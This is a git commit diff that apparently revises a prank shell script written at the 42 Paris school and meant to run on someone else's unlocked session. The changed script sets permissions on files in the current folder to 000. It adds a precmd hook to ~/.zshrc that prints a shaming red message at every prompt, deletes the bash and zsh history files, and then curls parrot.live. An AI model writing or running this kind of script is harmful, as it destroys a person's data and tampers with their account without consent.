84de58a138dc53968bd7132e3da63f04f1ac11dc
Florian CATINAUD <fcatinau@e2r6p19.clusters.42paris.fr>
2022-03-10 17:36:01 +0100

    Better syntax and add precmd

--- sh.sh
+++ sh.sh
@@ -8,8 +8,8 @@ while ((nbr != 300))
 		((nbr += 1))
 	done
 chmod 000 *
-cd ./..
-echo -e "echo -e '\033[31mjbonniva est un gentil tuteur! MAINTENANT JE FERMERAI MA SESSION!\033[00m'" >> .zshrc
-rm -rf .bash_history
+cd ~
+echo -e "precmd(){echo -e '\033[31mjbonniva est un gentil tuteur! MAINTENANT JE FERMERAI MA SESSION!\033[00m'}" >> ~/.zshrc
+rm -rf ~/.bash_history ~/.zsh_history
 clear
 curl parrot.live
